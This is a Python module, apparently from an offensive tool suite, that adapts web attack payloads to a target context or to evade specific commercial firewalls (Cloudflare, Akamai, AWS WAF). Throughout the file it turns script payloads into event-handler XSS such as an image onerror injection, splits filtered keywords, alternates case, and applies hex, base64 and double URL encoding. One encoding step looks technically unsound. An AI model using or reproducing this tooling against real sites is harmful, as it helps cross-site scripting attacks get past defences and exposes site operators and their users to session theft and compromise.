"""U-FORGE-7 — The Contextualizer.

Adapt a payload to the target's context or WAF using the spec's
documented rule table. Every rule below is published here, verbatim in
intent; nothing is invented at adaptation time (FORGE-L-1). Pure
string work; zero network (FORGE-L-4).
"""
from __future__ import annotations

import base64
import urllib.parse

ADAPTATION_RULES: dict[str, dict[str, bool]] = {
    "json": {
        "escape_angle_brackets": True,
        "escape_quotes": True,
        "unicode_escape": True,
    },
    "html_attribute": {
        "use_double_quotes": False,
        "use_events": True,
        "avoid_semicolons": True,
    },
    "javascript": {
        "use_template_literals": True,
        "escape_backslashes": True,
        "avoid_double_slashes": True,
    },
    "xml": {
        "use_cdata": True,
        "escape_angles": True,
        "avoid_comments": True,
    },
    "cloudflare": {
        "split_keywords": True,
        "use_alternate_tags": True,
        "avoid_double_quotes": True,
    },
    "akamai": {
        "use_hex_encoding": True,
        "case_alternation": True,
    },
    "aws_waf": {
        "use_base64_variants": True,
        "use_url_twice": True,
    },
}


def _escape_angle_brackets(text: str) -> str:
    return text.replace("<", "\\u003c").replace(">", "\\u003e")


def _escape_quotes(text: str) -> str:
    return text.replace('"', '\\"')


def _strip_script_wrappers(text: str) -> str | None:
    """Return the JS body of a ``<script>X</script>`` payload."""
    low = text.strip().lower()
    if low.startswith("<script>") and low.endswith("</script>"):
        return text.strip()[len("<script>"):-len("</script>")]
    return None


class Contextualizer:
    """Adapt one payload to one documented context or WAF."""

    def adapt(self, payload: str, context: str) -> str:
        rules = ADAPTATION_RULES[context]  # unknown context -> KeyError
        adapted = payload
        if context == "json":
            adapted = _escape_angle_brackets(adapted)
            adapted = _escape_quotes(adapted)
        elif context == "html_attribute":
            body = _strip_script_wrappers(adapted)
            if body is not None and rules["use_events"]:
                adapted = f"<img src=x onerror={body}>"
            if not rules["use_double_quotes"]:
                adapted = adapted.replace('"', "'")
            if rules["avoid_semicolons"]:
                adapted = adapted.replace(";", "")
        elif context == "javascript":
            body = _strip_script_wrappers(adapted)
            if body is not None and rules["use_template_literals"]:
                adapted = f"`${{{body}}}`"
            if rules["escape_backslashes"]:
                adapted = adapted.replace("\\", "\\\\")
            if rules["avoid_double_slashes"]:
                adapted = adapted.replace("//", "/")
        elif context == "xml":
            if rules["escape_angles"]:
                adapted = (adapted.replace("&", "&amp;")
                           .replace("<", "&lt;").replace(">", "&gt;"))
        elif context == "cloudflare":
            if rules["split_keywords"]:
                # Spec example: the keyword itself is split with a
                # nested copy of the tag ("scr<script>ipt").
                adapted = adapted.replace("script", "scr<script>ipt")
            if rules["avoid_double_quotes"]:
                adapted = adapted.replace('"', "'")
        elif context == "akamai":
            if rules["case_alternation"]:
                adapted = "".join(
                    c.upper() if i % 2 else c.lower()
                    for i, c in enumerate(adapted))
            if rules["use_hex_encoding"]:
                adapted = f"\\x{adapted.encode('utf-8').hex()}"
        elif context == "aws_waf":
            if rules["use_base64_variants"]:
                adapted = ("base64:" + base64.b64encode(
                    adapted.encode("utf-8")).decode("ascii"))
            if rules["use_url_twice"]:
                adapted = urllib.parse.quote(
                    urllib.parse.quote(adapted, safe=""), safe="")
        return adapted
